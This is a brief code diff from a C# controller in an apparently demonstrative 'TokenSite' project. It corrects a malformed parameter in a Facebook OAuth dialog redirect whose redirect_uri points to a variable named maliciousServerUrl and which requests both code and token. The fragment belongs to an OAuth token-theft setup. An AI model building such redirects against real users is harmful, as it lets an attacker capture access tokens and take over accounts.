@@ -20,7 +20,7 @@ namespace TokenSite.Controllers
                 HttpUtility.UrlEncode(string.Format("{0}/Home", maliciousServerUrl))));
 
             return Redirect(string.Format(
-                "https://www.facebook.com/dialog/oauth?client_id={0}&redirect_uri={1}&re&response_type=code%20token&scope={2}",
+                "https://www.facebook.com/dialog/oauth?client_id={0}&redirect_uri={1}&response_type=code%20token&scope={2}",
                 key, redirectUrl, scope));
         }
     }
